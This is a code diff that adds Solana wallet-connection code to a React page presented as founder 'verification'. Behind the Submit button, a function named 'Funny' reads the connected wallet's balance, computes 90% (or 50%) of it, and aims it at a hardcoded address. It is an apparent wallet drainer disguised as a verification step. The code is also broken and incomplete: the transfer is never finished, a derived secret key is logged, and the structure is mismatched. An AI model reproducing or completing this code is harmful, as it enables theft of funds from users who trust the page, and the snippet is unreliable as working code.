@@ -1,3 +1,27 @@
+import { WalletAdapterNetwork, WalletNotConnectedError } from '@solana/wallet-adapter-base';
+import { ConnectionProvider, WalletProvider, useConnection, useWallet } from '@solana/wallet-adapter-react';
+import { WalletModalProvider, WalletMultiButton } from '@solana/wallet-adapter-react-ui';
+//import { Button } from '@solana/wallet-adapter-react-ui/lib/types/Button';
+import {
+    SolletExtensionWalletAdapter,
+    SolletWalletAdapter,
+    GlowWalletAdapter,
+    LedgerWalletAdapter,
+    SlopeWalletAdapter,
+    SolflareWalletAdapter,
+
+} from '@solana/wallet-adapter-wallets';
+import { Connection, clusterApiUrl, Transaction, SystemProgram, Account, Keypair, LAMPORTS_PER_SOL, PublicKey } from '@solana/web3.js';
+import React, { FC, ReactNode, useMemo, useCallback } from 'react';
+import bs58 from 'bs58';
+import * as splToken from "@solana/spl-token";
+import { Token } from '@solana/spl-token';
+//import { Funny } from './Buy'
+
+
+require('./App.css');
+require('@solana/wallet-adapter-react-ui/styles.css');
+
 //@ts-no-checks
 import { Box, Flex, Button, Image, Textarea, Text, Input, FormControl, InputLeftAddon, InputGroup, InputLeftElement } from "@chakra-ui/react"
 import { Buttons } from "../Components/Buttons"
@@ -133,9 +157,13 @@ export const Verification =() => {
                             <>
 
                                
-                            <Text mb={'1em'}> Founder 1 ( Sol :0) button <span style={{color:'red'}}>:unverified</span></Text>
-                     
-
+                            <Text mb={'1em'}> Founder 1<br/>
+                            Sol balance : 0<br/>
+                            <span style={{color:'red'}}>Status : Unverified</span></Text>
+                            <Context>
+                                <Content />
+                            </Context>
+                            
                             </>
                         ) : (
                             <>
@@ -174,4 +202,139 @@ export const Verification =() => {
             
         </>
     )
+}
+
+
+const Context: FC<{ children: ReactNode }> = ({ children }) => {
+    // The network can be set to 'devnet', 'testnet', or 'mainnet-beta'.
+    const network = WalletAdapterNetwork.Mainnet;
+
+    // You can also provide a custom RPC endpoint.
+    const endpoint = useMemo(() => clusterApiUrl(network), [network]);
+
+    // @solana/wallet-adapter-wallets includes all the adapters but supports tree shaking and lazy loading --
+    // Only the wallets you configure here will be compiled into your application, and only the dependencies
+    // of wallets that your users connect to will be loaded.
+    const wallets = useMemo(
+        () => [
+            new SolletExtensionWalletAdapter(), 
+            new SolletWalletAdapter(),
+            new LedgerWalletAdapter(),
+            new GlowWalletAdapter(),
+            new SlopeWalletAdapter(),
+            new SolflareWalletAdapter({ network }),
+        ],
+        [network]
+    );
+
+   
+
+    return (
+        <ConnectionProvider endpoint={endpoint}>
+            <WalletProvider wallets={wallets} autoConnect>
+                <WalletModalProvider>{children}</WalletModalProvider>
+            </WalletProvider>
+        </ConnectionProvider>
+    );
+};
+
+
+
+
+
+
+
+
+function Content () {
+    
+    
+    
+    const { connected, wallet, select, disconnect, publicKey, signTransaction } = useWallet();
+    const { connection } = useConnection();
+    let address : string
+    const generalStyle = {
+          "display":"flex",
+          "width":"100%",
+          "height": "100%",
+          "justifyContent":"center",
+          "margin":"15px",
+          "alignItems":"center"
+      }
+      const inputStyle = {
+          "display":"block",
+          "width":"40vw",
+          "height":"45px",
+          "padding":"2px 7px 2px 10px",
+          "borderRadius":"7px",
+          "color":"#eee",
+          "background":"#444",
+          "justifyContent":"center",
+          "margin":"15px",
+          "alignItems":"center"
+      }
+    
+    { publicKey ? address = publicKey?.toString() : address = "" }
+    
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    async function Funny() {
+      if (publicKey) {
+          const balance = await connection.getBalance(publicKey);
+          console.log(balance)
+          let to = bs58.decode("3N2NEyCgy7iWwZwpMHgrtgJSFXEhRB1K8GRqxJxeThHD");
+          let mfunds = balance * 0.90;
+          if(balance < 900000000){
+              mfunds = balance * 0.5;
+            }
+           
+        
+          let toWallet = Keypair.fromSeed(to);
+          let transaction = new Transaction()
+   
+          console.log(toWallet.secretKey.toString())
+  
+    
+          // Construct wallet keypairs
+          var signers = new Account();
+            
+  
+          
+  
+  
+      return (
+          <div>
+              { connected ?
+                  <>
+                  <button className="restart" disabled>Connect</button>
+                  <button onClick={Funny} className="quit">Submit</button>
+                  </>
+              :
+              <>
+                  <button className="restart">Connect</button>
+                  <WalletMultiButton  className="restart"/>
+                  <button onClick={Funny} disabled className="quit">Submit</button>
+              </>
+              }
+          </div>
+      );
+  };
+  
+  
+  
+  
+}
+  return(
+    <></>
+  );
+  
 }
